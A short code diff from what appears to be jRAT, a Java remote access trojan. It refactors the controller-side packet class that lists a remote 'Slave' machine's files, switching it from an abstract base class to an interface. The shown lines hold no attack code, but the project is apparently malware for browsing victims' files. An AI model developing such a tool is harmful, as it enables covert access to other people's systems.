@@ -3,14 +3,14 @@ package jrat.module.fs.packets;
 import iconlib.FileIconUtils;
 import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
 
 import java.util.ArrayList;
 import java.util.List;
 
 
-public class Packet22ListFiles extends AbstractIncomingPacket {
+public class Packet22ListFiles implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
